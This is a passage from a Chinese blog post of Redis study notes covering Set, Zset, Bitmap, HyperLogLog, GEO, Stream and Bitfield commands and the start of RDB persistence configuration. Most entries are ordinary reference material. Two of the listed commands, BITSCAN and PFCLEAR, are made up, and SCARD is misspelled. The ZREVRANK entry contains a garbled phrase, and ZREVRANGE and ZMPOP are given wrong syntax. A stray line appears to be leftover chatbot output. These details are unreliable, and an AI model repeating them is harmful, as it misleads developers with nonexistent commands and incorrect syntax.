<p><strong>功能</strong>：从存储在键中的集合中移除指定的成员。</p>
<p><strong>可选参数</strong>：无</p>
<p><strong>返回值</strong>：从集合中成功移除的成员数量，不包括集合中不存在的成员。</p>
<hr>
<h4 id="SCARD"><a href="#SCARD" class="headerlink" title="SCARD"></a>SCARD</h4><p><strong>命令</strong>：<code>SACRD key</code></p>
<p><strong>功能</strong>：获取集合中的元素个数</p>
<p><strong>可选参数</strong>：无</p>
<p><strong>返回值</strong>：集合中的元素个数</p>
<hr>
<h4 id="SRANDMEMBER"><a href="#SRANDMEMBER" class="headerlink" title="SRANDMEMBER"></a>SRANDMEMBER</h4><p><strong>命令</strong>：<code>SRANDMEMBER key N</code></p>
<p><strong>功能</strong>：从集合中随机展现N个元素，不删除</p>
<p><strong>可选参数</strong>：无</p>
<p><strong>返回值</strong>：N个元素</p>
<hr>
<h4 id="SPOP"><a href="#SPOP" class="headerlink" title="SPOP"></a>SPOP</h4><p><strong>命令</strong>：<code>SPOP key N</code></p>
<p><strong>功能</strong>：从集合中随机弹出N个元素，每弹出一个删除一个</p>
<p><strong>可选参数</strong>：无</p>
<p><strong>返回值</strong>：从集合中弹出的元素。</p>
<hr>
<h4 id="SMOVE"><a href="#SMOVE" class="headerlink" title="SMOVE"></a>SMOVE</h4><p><strong>命令</strong>：<code>SMOVE key1 key2 member</code></p>
<p><strong>功能</strong>：从集合key1中移动member到集合key2中，key1中不再包含member</p>
<p><strong>可选参数</strong>：无</p>
<p><strong>返回值</strong>：成功操作的成员数量</p>
<hr>
<h4 id="【重要】集合运算"><a href="#【重要】集合运算" class="headerlink" title="【重要】集合运算"></a>【重要】集合运算</h4><h5 id="差集运算SDIFF"><a href="#差集运算SDIFF" class="headerlink" title="差集运算SDIFF"></a>差集运算SDIFF</h5><p><strong>命令</strong>：<code>SDIFF key1 [key2...]</code></p>
<p><strong>功能</strong>：获取属于key1但不属于key2的元素。</p>
<p><strong>可选参数</strong>：无</p>
<p><strong>返回值</strong>：属于key1但不属于key2的元素。</p>
<hr>
<h5 id="并集运算SUNION"><a href="#并集运算SUNION" class="headerlink" title="并集运算SUNION"></a>并集运算SUNION</h5><p><strong>命令</strong>：<code>SUNION key1 [key2...]</code></p>
<p><strong>功能</strong>：获取属于key1或属于key2的元素。</p>
<p><strong>可选参数</strong>：无</p>
<p><strong>返回值</strong>：属于key1或属于key2的元素。</p>
<hr>
<h5 id="交集运算SINTER"><a href="#交集运算SINTER" class="headerlink" title="交集运算SINTER"></a>交集运算SINTER</h5><p><strong>命令</strong>：<code>SINTER key1 [key2...]</code></p>
<p><strong>功能</strong>：获取属于key1并且属于key2的元素。</p>
<p><strong>可选参数</strong>：无</p>
<p><strong>返回值</strong>：属于key1并且属于key2的元素。</p>
<p>另：</p>
<p><strong>命令</strong>：<code>SINTERCARD keynums key1 [key2...] [LIMIT N]</code></p>
<p><strong>功能</strong>：返回属于key1并且属于key2的元素个数，当查到N个属于key1并且属于key2的元素后，不再继续查询。</p>
<p><strong>参数</strong>：</p>
<ul>
<li>keynums是命令中包含的键个数</li>
<li>limit是限制返回的个数，可以加快查询速度，只要确定了有N个相同元素就立即返回，不再判断是否还存在其他相同元素。</li>
</ul>
<h3 id="Zset类型"><a href="#Zset类型" class="headerlink" title="Zset类型"></a>Zset类型</h3><p>在set基础上为每个value值前添加了score分数，形成 <strong>按SCORE排序的有序不可重复集合</strong></p>
<p>应用场景：</p>
<ul>
<li>热销商品销量排行榜</li>
</ul>
<h4 id="ZADD"><a href="#ZADD" class="headerlink" title="ZADD"></a>ZADD</h4><p><strong>命令</strong>：<code>ZADD key [NX|XX] [CH] [INCR] score member [score member ...]</code></p>
<p><strong>功能</strong>：将一个或多个成员添加到有序集合中，或者更新已存在成员的分数。可以根据不同的选项来控制添加和更新的行为。</p>
<p><strong>可选参数</strong>：</p>
<ul>
<li><code>NX</code>: 只在成员不存在时添加。</li>
<li><code>XX</code>: 只在成员已经存在时更新。</li>
<li><code>CH</code>: 修改返回值为变更后的元素数量（包括新增和更新的）。</li>
<li><code>INCR</code>: 将成员的分数进行增量操作，并只返回增加后的分数。</li>
</ul>
<p><strong>返回值</strong>：</p>
<ul>
<li>不使用<code>INCR</code>选项时，返回成功添加或更新的成员数量。</li>
<li>使用<code>INCR</code>选项时，返回成员的新分数。</li>
</ul>
<hr>
<h4 id="ZRANGE"><a href="#ZRANGE" class="headerlink" title="ZRANGE"></a>ZRANGE</h4><p><strong>命令</strong>：<code>ZRANGE key start stop [WITHSCORES]</code></p>
<p><strong>功能</strong>：返回有序集合中指定区间内的成员，按分数<strong>从低到高</strong>排序。</p>
<p><strong>可选参数</strong>：</p>
<ul>
<li><code>WITHSCORES</code>: 同时返回成员及其分数。</li>
</ul>
<p><strong>返回值</strong>：指定区间内的成员列表。如果使用了<code>WITHSCORES</code>选项，则返回成员及其分数组成的列表。</p>
<hr>
<h4 id="ZREVRANGE"><a href="#ZREVRANGE" class="headerlink" title="ZREVRANGE"></a>ZREVRANGE</h4><p><strong>命令</strong>：<code>ZREVRANGE key start stop [WITHSCORES] [LIMIT offset count]</code></p>
<p><strong>功能</strong>：返回有序集合中指定区间内的成员，按分数<strong>从高到低</strong>排序。</p>
<p><strong>可选参数</strong>：</p>
<ul>
<li><code>WITHSCORES</code>: 同时返回成员及其分数。</li>
<li><code>LIMIT</code>：限制返回数量</li>
</ul>
<p><strong>返回值</strong>：指定区间内的成员列表。如果使用了<code>WITHSCORES</code>选项，则返回成员及其分数组成的列表。</p>
<hr>
<h4 id="ZREM"><a href="#ZREM" class="headerlink" title="ZREM"></a>ZREM</h4><p><strong>命令</strong>：<code>ZREM key member [member ...]</code></p>
<p><strong>功能</strong>：从有序集合中移除一个或多个成员。</p>
<p><strong>可选参数</strong>：无</p>
<p><strong>返回值</strong>：成功移除的成员数量。</p>
<hr>
<h4 id="ZSCORE"><a href="#ZSCORE" class="headerlink" title="ZSCORE"></a>ZSCORE</h4><p><strong>命令</strong>：<code>ZSCORE key member</code></p>
<p><strong>功能</strong>：获取有序集合中成员的分数。</p>
<p><strong>可选参数</strong>：无</p>
<p><strong>返回值</strong>：成员的分数。如果成员不存在于有序集合中，返回<code>nil</code>。</p>
<p>以下是关于 <code>ZCARD</code> 和 <code>ZINCRBY</code> 的详细介绍，仍然遵循您指定的格式：</p>
<hr>
<h4 id="ZCARD"><a href="#ZCARD" class="headerlink" title="ZCARD"></a>ZCARD</h4><p><strong>命令</strong>：<code>ZCARD key</code></p>
<p><strong>功能</strong>：返回有序集合中成员的数量。</p>
<p><strong>可选参数</strong>：无</p>
<p><strong>返回值</strong>：</p>
<ul>
<li>如果键存在且为有序集合类型，返回集合中的成员数量。</li>
<li>如果键不存在或不是有序集合类型，返回<code>0</code>。</li>
</ul>
<hr>
<h4 id="ZINCRBY"><a href="#ZINCRBY" class="headerlink" title="ZINCRBY"></a>ZINCRBY</h4><p><strong>命令</strong>：<code>ZINCRBY key increment member</code></p>
<p><strong>功能</strong>：为有序集合中指定成员的分数增加（或减少）给定的增量值。如果成员不存在，则会在添加成员的同时为其赋值为<code>increment</code>。</p>
<p><strong>可选参数</strong>：无</p>
<p><strong>返回值</strong>：操作完成后成员的新分数值。</p>
<hr>
<h4 id="ZMPOP"><a href="#ZMPOP" class="headerlink" title="ZMPOP"></a>ZMPOP</h4><p><strong>命令</strong>：<code>ZMPOP numkeys key [key ...] [WITHSCORES]</code></p>
<p><strong>功能</strong>：从多个有序集合中移除并返回分数最高的成员（或根据配置规则选择的成员）。如果指定了 <code>WITHSCORES</code>，则同时返回成员及其分数。</p>
<p><strong>可选参数</strong>：</p>
<ul>
<li><code>WITHSCORES</code>: 同时返回成员及其分数。</li>
</ul>
<p><strong>返回值</strong>：</p>
<ul>
<li>如果操作成功，返回一个数组，其中包含被移除的成员（以及可选的分数）。</li>
<li>如果指定的键不存在或有序集合为空，则返回<code>nil</code>。</li>
</ul>
<p><strong>说明</strong>：</p>
<ul>
<li><code>numkeys</code> 参数表示后续提供的键的数量。</li>
<li>操作会从第一个非空的有序集合中移除并返回成员。</li>
<li>该命令在 Redis 7.0 及以上版本中可用。</li>
</ul>
<hr>
<h4 id="ZRANK"><a href="#ZRANK" class="headerlink" title="ZRANK"></a>ZRANK</h4><p><strong>命令</strong>：<code>ZRANK key member</code></p>
<p><strong>功能</strong>：获取有序集合中指定成员的排名，按分数从小到大排序。</p>
<p><strong>可选参数</strong>：无</p>
<p><strong>返回值</strong>：如果成员存在于有序集合中，返回其排名（基于0的索引）。如果成员不存在，返回<code>nil</code>。</p>
<p>这些命令帮助用户有效地管理Redis中的有序集合数据结构，包括添加、查询、删除成员以及根据分数或排名对成员进行操作。通过这些命令，可以实现诸如排行榜等复杂应用。</p>
<p>另：</p>
<p><strong>命令</strong>：<code>ZREVRANK key member</code></p>
<p><strong>功能</strong>：获取有序集合中指定成员的排名，按分数吃的东西排序。</p>
<h3 id="Bitmap类型"><a href="#Bitmap类型" class="headerlink" title="Bitmap类型"></a>Bitmap类型</h3><p>由0和1状态表现的二进制位的bit数组，是基于String类型的按位的操作，给数组由多个二进制位组成，每个二进制位都对应一个偏移量，最大位数是$2^{32}$位。</p>
<p>应用场景：</p>
<ul>
<li>签到系统、登录全勤</li>
</ul>
<hr>
<h4 id="SETBIT"><a href="#SETBIT" class="headerlink" title="SETBIT"></a>SETBIT</h4><p><strong>命令</strong>：<code>SETBIT key offset value</code></p>
<p><strong>功能</strong>：对键对应的位图中指定偏移量 <code>offset</code> (从0开始）的位设置值为 <code>value</code>（0 或 1）。</p>
<p><strong>可选参数</strong>：无</p>
<p><strong>返回值</strong>：操作之前该位的原始值（0 或 1）。</p>
<hr>
<h4 id="GETBIT"><a href="#GETBIT" class="headerlink" title="GETBIT"></a>GETBIT</h4><p><strong>命令</strong>：<code>GETBIT key offset</code></p>
<p><strong>功能</strong>：获取键对应的位图中指定偏移量 <code>offset</code> 的位的值。</p>
<p><strong>可选参数</strong>：无</p>
<p><strong>返回值</strong>：指定偏移量的位值（0 或 1）。如果键不存在或偏移量超出当前位图范围，则返回<code>0</code>。</p>
<hr>
<h4 id="BITCOUNT"><a href="#BITCOUNT" class="headerlink" title="BITCOUNT"></a>BITCOUNT</h4><p><strong>命令</strong>：<code>BITCOUNT key [start end]</code></p>
<p><strong>功能</strong>：计算键对应的位图中指定范围内<strong>值为 1 的位的数量</strong>。如果没有指定范围，则统计整个位图。</p>
<p><strong>可选参数</strong>：</p>
<ul>
<li><code>start</code> 和 <code>end</code>：指定统计范围的起始和结束字节偏移量。</li>
</ul>
<p><strong>返回值</strong>：值为 1 的位的数量。</p>
<hr>
<h4 id="BITPOS"><a href="#BITPOS" class="headerlink" title="BITPOS"></a>BITPOS</h4><p><strong>命令</strong>：<code>BITPOS key bit [start] [end]</code></p>
<p><strong>功能</strong>：查找键对应的位图中第一个匹配指定值（<code>bit</code>，0 或 1）的位的位置。</p>
<p><strong>可选参数</strong>：</p>
<ul>
<li><code>start</code> 和 <code>end</code>：指定搜索范围的起始和结束字节偏移量。</li>
</ul>
<p><strong>返回值</strong>：找到的第一个匹配位的偏移量。如果未找到，返回<code>-1</code>。</p>
<hr>
<h4 id="BITOP"><a href="#BITOP" class="headerlink" title="BITOP"></a>BITOP</h4><p><strong>命令</strong>：<code>BITOP operation destkey key [key ...]</code></p>
<p><strong>功能</strong>：对一个或多个位图执行按位操作（如 AND、OR、NOT 等），并将结果保存到目标键 <code>destkey</code> 中。</p>
<p><strong>可选参数</strong>：无</p>
<p><strong>返回值</strong>：目标位图的长度（以位为单位）。</p>
<hr>
<h4 id="STRLEN-1"><a href="#STRLEN-1" class="headerlink" title="STRLEN"></a>STRLEN</h4><p><strong>命令</strong>：<code>STRLEN key</code></p>
<p><strong>功能</strong>： 统计位图拥有的字节数。</p>
<p><strong>可选参数</strong>：无</p>
<p><strong>返回值</strong>：位图拥有的字节数</p>
<hr>
<h4 id="BITSCAN"><a href="#BITSCAN" class="headerlink" title="BITSCAN"></a>BITSCAN</h4><p><strong>命令</strong>：<code>BITSCAN key bit [start]</code></p>
<p><strong>功能</strong>：从指定位置开始扫描位图，寻找第一个匹配指定值（<code>bit</code>，0 或 1）的位。</p>
<p><strong>可选参数</strong>：</p>
<ul>
<li><code>start</code>：指定扫描的起始偏移量。</li>
</ul>
<p><strong>返回值</strong>：找到的第一个匹配位的偏移量。如果未找到，返回空列表。</p>
<h3 id="HyperLogLog类型"><a href="#HyperLogLog类型" class="headerlink" title="HyperLogLog类型"></a>HyperLogLog类型</h3><p>HyperLogLog只会根据输入元素来计算基数（数据集去重复后的真实个数），不会存储输入元素本身，因此HyperLogLog不能像集合那样返回输入的各个元素。某个HyperLogLog键只需要花费12KB内存，即可计算接近 $2^{64}$ 个不同元素的基数，但存在 0.81% 的误差。底层是String类型。</p>
<p>应用场景：</p>
<ul>
<li>统计某个文章&#x2F;网站等的UV(独立访客，同一IP地址认为同一个访客，需要考虑去重，即一天只计算一次)</li>
<li>统计用户一天搜索关键字数量（同一个关键字可能搜索多次，但只记录一次）</li>
</ul>
<hr>
<h4 id="PFADD"><a href="#PFADD" class="headerlink" title="PFADD"></a>PFADD</h4><p><strong>命令</strong>：<code>PFADD key element [element ...]</code></p>
<p><strong>功能</strong>：将一个或多个元素添加到指定键的 HyperLogLog 数据结构中。</p>
<p><strong>可选参数</strong>：无</p>
<p><strong>返回值</strong>：</p>
<ul>
<li>如果至少有一个元素被成功添加到 HyperLogLog 中，返回 <code>1</code>。</li>
<li>如果所有元素都已经存在，返回 <code>0</code>。</li>
</ul>
<hr>
<h4 id="PFCOUNT"><a href="#PFCOUNT" class="headerlink" title="PFCOUNT"></a>PFCOUNT</h4><p><strong>命令</strong>：<code>PFCOUNT key [key ...]</code></p>
<p><strong>功能</strong>：返回一个或多个 HyperLogLog 的近似基数（即唯一元素的数量）。如果提供了多个键，则返回它们的并集的近似基数。</p>
<p><strong>可选参数</strong>：无</p>
<p><strong>返回值</strong>：计算得到的近似基数。</p>
<hr>
<h4 id="PFMERGE"><a href="#PFMERGE" class="headerlink" title="PFMERGE"></a>PFMERGE</h4><p><strong>命令</strong>：<code>PFMERGE destkey sourcekey [sourcekey ...]</code></p>
<p><strong>功能</strong>：将一个或多个源 HyperLogLog 合并到目标 HyperLogLog 中。合并后，目标 HyperLogLog 的近似基数等于所有源 HyperLogLog 的并集的近似基数。</p>
<p><strong>可选参数</strong>：无</p>
<p><strong>返回值</strong>：始终返回 <code>OK</code>。</p>
<hr>
<h4 id="PFCLEAR"><a href="#PFCLEAR" class="headerlink" title="PFCLEAR"></a>PFCLEAR</h4><p><strong>命令</strong>：<code>PFCLEAR key</code></p>
<p><strong>功能</strong>：清空指定键对应的 HyperLogLog 数据结构，将其重置为初始状态。</p>
<p><strong>可选参数</strong>：无</p>
<p><strong>返回值</strong>：始终返回 <code>OK</code>。</p>
<hr>
<h3 id="GEO-Geospatial-indexes-类型"><a href="#GEO-Geospatial-indexes-类型" class="headerlink" title="GEO(Geospatial indexes)类型"></a>GEO(Geospatial indexes)类型</h3><hr>
<h4 id="GEOADD"><a href="#GEOADD" class="headerlink" title="GEOADD"></a>GEOADD</h4><p><strong>命令</strong>：<code>GEOADD key longitude latitude member [longitude latitude member ...]</code></p>
<p><strong>功能</strong>：将一个或多个地理位置（由经度、纬度和成员名称组成）添加到指定的键中。</p>
<p><strong>可选参数</strong>：无</p>
<p><strong>返回值</strong>：成功添加的新成员数量（不包括已存在的成员）。</p>
<hr>
<h4 id="GEODIST"><a href="#GEODIST" class="headerlink" title="GEODIST"></a>GEODIST</h4><p><strong>命令</strong>：<code>GEODIST key member1 member2 [unit]</code></p>
<p><strong>功能</strong>：计算两个地理位置之间的距离。单位可以是米（默认）、千米、米制英里或英尺。</p>
<p><strong>可选参数</strong>：</p>
<ul>
<li><code>unit</code>: 指定距离单位（<code>m</code>, <code>km</code>, <code>mi</code>, <code>ft</code>）。</li>
</ul>
<p><strong>返回值</strong>：两个成员之间的距离，以指定单位表示。如果任意一个成员不存在，则返回 <code>nil</code>。</p>
<hr>
<h4 id="GEOPOS"><a href="#GEOPOS" class="headerlink" title="GEOPOS"></a>GEOPOS</h4><p><strong>命令</strong>：<code>GEOPOS key member [member ...]</code></p>
<p><strong>功能</strong>：返回一个或多个成员的经度和纬度坐标。</p>
<p><strong>可选参数</strong>：无</p>
<p><strong>返回值</strong>：包含每个成员坐标的数组。如果某个成员不存在，则返回 <code>nil</code>。</p>
<hr>
<h4 id="GEORADIUS"><a href="#GEORADIUS" class="headerlink" title="GEORADIUS"></a>GEORADIUS</h4><p><strong>命令</strong>：<code>GEORADIUS key longitude latitude radius m|km|ft|mi [WITHCOORD] [WITHDIST] [WITHHASH] [COUNT count] [ASC|DESC] [STORE key] [STOREDIST key]</code></p>
<p><strong>功能</strong>：查找给定地理坐标范围内的所有成员，并可选择返回附加信息（如距离、坐标等）。</p>
<p><strong>可选参数</strong>：</p>
<ul>
<li><code>WITHCOORD</code>: 返回每个成员的经纬度坐标。</li>
<li><code>WITHDIST</code>: 返回每个成员与中心点的距离。</li>
<li><code>WITHHASH</code>: 返回每个成员的地理哈希值。</li>
<li><code>COUNT count</code>: 限制返回的成员数量。</li>
<li><code>ASC|DESC</code>: 按距离升序或降序排序。</li>
<li><code>STORE key</code>: 将结果存储到指定键中。</li>
<li><code>STOREDIST key</code>: 将结果及其与中心点的距离存储到指定键中。</li>
</ul>
<p><strong>返回值</strong>：范围内的成员列表，以及根据选项附加的信息。</p>
<hr>
<h4 id="GEORADIUSBYMEMBER"><a href="#GEORADIUSBYMEMBER" class="headerlink" title="GEORADIUSBYMEMBER"></a>GEORADIUSBYMEMBER</h4><p><strong>命令</strong>：<code>GEORADIUSBYMEMBER key member radius m|km|ft|mi [WITHCOORD] [WITHDIST] [WITHHASH] [COUNT count] [ASC|DESC] [STORE key] [STOREDIST key]</code></p>
<p><strong>功能</strong>：以某个已存在的成员为圆心，查找指定范围内的所有成员。</p>
<p><strong>可选参数</strong>：</p>
<ul>
<li>同 <code>GEORADIUS</code> 命令。</li>
</ul>
<p><strong>返回值</strong>：范围内的成员列表，以及根据选项附加的信息。</p>
<hr>
<h4 id="GEOHASH"><a href="#GEOHASH" class="headerlink" title="GEOHASH"></a>GEOHASH</h4><p><strong>命令</strong>：<code>GEOHASH key member [member ...]</code></p>
<p><strong>功能</strong>：返回一个或多个成员的 Geohash 表示。Geohash 是一种将二维地理坐标（经度和纬度）编码为字符串的方法，常用于地理位置索引和查询。</p>
<p><strong>可选参数</strong>：无</p>
<p><strong>返回值</strong>：包含每个成员 Geohash 字符串的数组。如果某个成员不存在，则返回 <code>nil</code>。</p>
<hr>
<h3 id="Stream类型"><a href="#Stream类型" class="headerlink" title="Stream类型"></a>Stream类型</h3><p>Stream就是Redis版的MQ消息队列中间件+阻塞队列</p>
<p>Redis 消息队列两种方案</p>
<ol>
<li><p><strong>List 实现的痛点</strong>  </p>
<ul>
<li>数据结构简单，但缺乏消息确认机制，可能导致消息丢失或重复消费。</li>
<li>不支持复杂的消费者组模型，难以满足分布式场景下的需求。</li>
</ul>
</li>
<li><p><strong>发布订阅实现的痛点</strong>  </p>
<ul>
<li>消息是实时推送的，一旦客户端断开连接，消息就会丢失，无法持久化。</li>
<li>不支持消息回溯和重放，限制了其在某些场景中的应用。</li>
</ul>
</li>
</ol>
<p><strong>Stream(redis5.0后) 的功能</strong>  </p>
<ul>
<li>提供持久化的消息存储能力，支持消息回溯与重放。</li>
<li>支持消费者组（Consumer Group），允许多个消费者协同处理任务，适合分布式系统。</li>
<li>每条消息都有唯一的 ID，便于追踪和管理。</li>
</ul>
<p>Stream结构：</p>
<p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20250210183332.png"></p>
<hr>
<h4 id="XADD"><a href="#XADD" class="headerlink" title="XADD"></a>XADD</h4><p><strong>命令</strong>：<code>XADD key [MAXLEN|MINID length] [*|id] field value [field value ...]</code></p>
<p><strong>功能</strong>：向指定的 Stream 队列中追加<strong>一条新消息（全部f-v视为同一条消息）</strong>。如果 Stream 不存在，则会自动创建。</p>
<p><strong>可选参数</strong>：</p>
<ul>
<li><code>MAXLEN</code> 或 <code>MINID</code>：用于限制 Stream 的长度或最小 ID。</li>
<li><code>*</code>：自动生成唯一的消息 ID，越早添加的越小。</li>
</ul>
<p><strong>返回值</strong>：新消息的 ID。</p>
<hr>
<h4 id="XRANGE"><a href="#XRANGE" class="headerlink" title="XRANGE"></a>XRANGE</h4><p><strong>命令</strong>：<code>XRANGE key start end [COUNT count]</code></p>
<p><strong>功能</strong>：按时间顺序返回指定范围内的消息。</p>
<p><strong>可选参数</strong>：</p>
<ul>
<li><code>start</code>：开始值，可以使用<code>-</code>表示最小值</li>
<li><code>end</code>：结束值，可以使用<code>+</code>表示最大值</li>
</ul>
<ul>
<li><code>COUNT</code>：限制返回的消息数量。</li>
</ul>
<p><strong>返回值</strong>：消息列表，每条消息包含 ID 和字段值对。</p>
<hr>
<h4 id="XREVRANGE"><a href="#XREVRANGE" class="headerlink" title="XREVRANGE"></a>XREVRANGE</h4><p><strong>命令</strong>：<code>XREVRANGE key end start [COUNT count]</code></p>
<p><strong>功能</strong>：按逆时间顺序返回指定范围内的消息。</p>
<p><strong>可选参数</strong>：</p>
<ul>
<li><code>COUNT</code>：限制返回的消息数量。</li>
</ul>
<p><strong>返回值</strong>：消息列表，每条消息包含 ID 和字段值对。</p>
<hr>
<h4 id="XDEL"><a href="#XDEL" class="headerlink" title="XDEL"></a>XDEL</h4><p><strong>命令</strong>：<code>XDEL key id [id ...]</code></p>
<p><strong>功能</strong>：从指定的 Stream 中删除一条或多条消息。</p>
<p><strong>可选参数</strong>：无</p>
<p><strong>返回值</strong>：成功删除的消息数量。</p>
<hr>
<h4 id="XLEN"><a href="#XLEN" class="headerlink" title="XLEN"></a>XLEN</h4><p><strong>命令</strong>：<code>XLEN key</code></p>
<p><strong>功能</strong>：返回指定 Stream 中消息的数量。</p>
<p><strong>可选参数</strong>：无</p>
<p><strong>返回值</strong>：消息的数量。如果 Stream 不存在，则返回 <code>0</code>。</p>
<hr>
<h4 id="XTRIM"><a href="#XTRIM" class="headerlink" title="XTRIM"></a>XTRIM</h4><p><strong>命令</strong>：<code>XTRIM key MAXLEN~|MINID~ threshold</code></p>
<p><strong>功能</strong>：修剪 Stream，保留最近的消息或高于指定 ID 的消息。</p>
<p><strong>可选参数</strong>：无</p>
<p><strong>返回值</strong>：被修剪的消息数量。</p>
<p>示例：</p>
<blockquote>
<p>XTRIM mystream MAXLEN 2</p>
<p>XTRIM mystream MINID 1739184426822-0</p>
</blockquote>
<hr>
<h4 id="XREAD"><a href="#XREAD" class="headerlink" title="XREAD"></a>XREAD</h4><p><strong>命令</strong>：<code>XREAD [COUNT count] [BLOCK milliseconds] STREAMS key [key ...] id [id ...]</code></p>
<p><strong>功能</strong>：从一个或多个 Stream 中读取消息。支持阻塞模式以等待新消息的到来。</p>
<p><strong>可选参数</strong>：</p>
<ul>
<li><code>COUNT</code>：限制每次读取的消息数量。</li>
<li><code>BLOCK</code>：设置阻塞时间（毫秒），等待新消息。</li>
</ul>
<p><strong>返回值</strong>：包含每个 Stream 及其消息的数组。</p>
<p>示例：</p>
<blockquote>
<p>XREAD count 2 STREAMS mystream 0-0 	&#x2F;&#x2F; 从最小的ID开始获取消息，消息越早添加的 ID越小。</p>
<p>XREAD count 2 STREAMS mystream 000 	&#x2F;&#x2F; 同上</p>
<p>XREAD count 2 STREAMS mystream $		&#x2F;&#x2F; 从最大的ID开始获取消息</p>
<p>xread count 2 streams mystream 1739184754364-0  &#x2F;&#x2F; 从id开始（不包括id）往后读两个消息</p>
</blockquote>
<hr>
<h4 id="XGROUP-CREATE"><a href="#XGROUP-CREATE" class="headerlink" title="XGROUP CREATE"></a>XGROUP CREATE</h4><p><strong>命令</strong>：<code>XGROUP CREATE key groupname id-or-$</code></p>
<p><strong>功能</strong>：为指定的 Stream 创建一个新的消费者组，并指定从id消息还是消费（如果是￥表示最近的消息）。</p>
<p><strong>可选参数</strong>：无</p>
<p><strong>返回值</strong>：始终返回 <code>OK</code>。</p>
<hr>
<h4 id="XREADGROUP"><a href="#XREADGROUP" class="headerlink" title="XREADGROUP"></a>XREADGROUP</h4><p><strong>命令</strong>：<code>XREADGROUP GROUP group consumer [COUNT count] [BLOCK milliseconds] STREAMS key [key ...] id [id ...]</code></p>
<p><strong>功能</strong>：从消费者组的角度读取消息，通常用于消费未被处理的消息。</p>
<p><strong>可选参数</strong>：</p>
<ul>
<li><code>COUNT</code>：限制每次读取的消息数量。</li>
<li><code>BLOCK</code>：设置阻塞时间（毫秒），等待新消息。<code>0</code> 表示无限期等待，直到有新消息到达</li>
</ul>
<p><strong>返回值</strong>：包含每个 Stream 及其消息的数组。</p>
<hr>
<h4 id="XINFO-STREAM"><a href="#XINFO-STREAM" class="headerlink" title="XINFO STREAM"></a>XINFO STREAM</h4><p><strong>命令</strong>：<code>XINFO STREAM key</code></p>
<p><strong>功能</strong>：获取指定 Stream 的详细信息，包括长度、第一个和最后一个消息等。</p>
<p><strong>可选参数</strong>：无</p>
<p><strong>返回值</strong>：Stream 的元数据信息。</p>
<p>另：</p>
<p><code>XINFO CONSUMERS</code>：查看消费者组中的消费者状态。</p>
<hr>
<h4 id="XPENDING"><a href="#XPENDING" class="headerlink" title="XPENDING"></a>XPENDING</h4><p><strong>命令</strong>：<code>XPENDING key group [start end count] [consumer]</code></p>
<p><strong>功能</strong>：查看指定消费者组中待处理消息（Pending Messages）的状态信息。这些消息是指已经被某个消费者获取但尚未确认完成的消息。</p>
<p><strong>可选参数</strong>：</p>
<ul>
<li><code>start</code> 和 <code>end</code>：指定范围内的消息 ID，用于返回特定范围的待处理消息。</li>
<li><code>count</code>：限制返回的消息数量。</li>
<li><code>consumer</code>：指定消费者名称，仅返回该消费者待处理的消息。</li>
</ul>
<p><strong>返回值</strong>：</p>
<ul>
<li>如果不指定范围和消费者，返回一个数组，包含以下信息：<ul>
<li>待处理消息的数量。</li>
<li>消费者组中最早和最晚的待处理消息 ID。</li>
<li>当前活跃消费者的数量。</li>
</ul>
</li>
<li>如果指定了范围和消费者，返回一个列表，每条记录包含：<ul>
<li>消息 ID。</li>
<li>消费者的名称。</li>
<li>消息处于待处理状态的时间（毫秒）。</li>
<li>消息最后一次交付的尝试次数。</li>
</ul>
</li>
</ul>
<hr>
<h4 id="XACK"><a href="#XACK" class="headerlink" title="XACK"></a>XACK</h4><p><strong>命令</strong>：<code>XACK key group id [id ...]</code></p>
<p><strong>功能</strong>：确认消费者组中的一条或多条消息已被成功处理。一旦消息被确认，它将从待处理消息列表（Pending Messages）中移除。</p>
<p><strong>可选参数</strong>：无</p>
<p><strong>返回值</strong>：成功确认的消息数量。</p>
<hr>
<h3 id="Bitfield类型【了解】"><a href="#Bitfield类型【了解】" class="headerlink" title="Bitfield类型【了解】"></a>Bitfield类型【了解】</h3><h4 id="BITFIELD"><a href="#BITFIELD" class="headerlink" title="BITFIELD"></a>BITFIELD</h4><p><strong>命令</strong>：<code>BITFIELD key subcommand [subcommand ...]</code></p>
<p><strong>功能</strong>：对位图（Bitmap）中的任意宽度整数进行读取、写入和修改操作。支持多种子命令，适用于复杂的位操作场景。</p>
<p><strong>可选参数</strong>：无</p>
<p><strong>返回值</strong>：根据子命令的不同，返回一个数组，包含每个子命令的结果。</p>
<h2 id="三、持久化"><a href="#三、持久化" class="headerlink" title="三、持久化"></a>三、持久化</h2><p>Redis是一种缓存数据库，缓存不能持久化保持数据，因此需要写入硬盘。Redis的持久化就是将缓存数据写入硬盘的方法。Redis 是一种内存数据库，为了在系统崩溃或重启后能够恢复数据，提供了两种主要的持久化机制：<strong>RDB（Redis Database Backup）</strong> 和 <strong>AOF（Append Only File）</strong>。</p>
<h3 id="RDB-Redis-Database"><a href="#RDB-Redis-Database" class="headerlink" title="RDB(Redis Database)"></a>RDB(Redis Database)</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>类似快照的形式，每隔一段时间将此时刻的数据和状态以文件形式写到磁盘上，这个快照文件就称为RDB文件（dump.rdb).</p>
<h4 id="备份与恢复"><a href="#备份与恢复" class="headerlink" title="备份与恢复"></a>备份与恢复</h4><p>修改配置文件后应当重启服务。</p>
<h5 id="备份间隔"><a href="#备份间隔" class="headerlink" title="备份间隔"></a>备份间隔</h5><p><strong>默认保存间隔</strong>：</p>
<ul>
<li>6.0.16及以下：<ul>
<li>每隔15分钟（如果发生了至少1次修改）。</li>
<li>每隔5分钟（如果发生了至少10次修改）。</li>
<li>每隔1分钟（如果发生了至少10000次修改）。</li>
</ul>
</li>
<li>6.0.16以上：<ul>
<li>每隔60分钟（如果发生了至少1次修改）。</li>
<li>每隔5分钟（如果发生了至少10次修改）。</li>
<li>每隔1分钟（如果发生了至少10000次修改）。</li>
</ul>
</li>
</ul>
<p><strong>自定义保存间隔：</strong></p>
<ul>
<li><p>方法一：修改myradis.conf配置文件（即安装后设置的配置文件），在被注释的<code>save 3600 1 300 100 60 10000</code>下设置自己希望的间隔，如每5秒钟如果有两次修改即备份，则添加如下配置：</p>
  <figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">save 5 2</span><br></pre></td></tr></table></figure></li>
</ul>
<h5 id="rdb文件保存位置"><a href="#rdb文件保存位置" class="headerlink" title="rdb文件保存位置"></a>rdb文件保存位置</h5><p>修改radis7.conf配置文件（即安装后设置的配置文件），将<code>dir ./</code>修改为自己希望的rdb文件保存位置（设置的路径不能为空，必须提前建好文件夹），如<code>dir /myradis/dumpfiles</code></p>
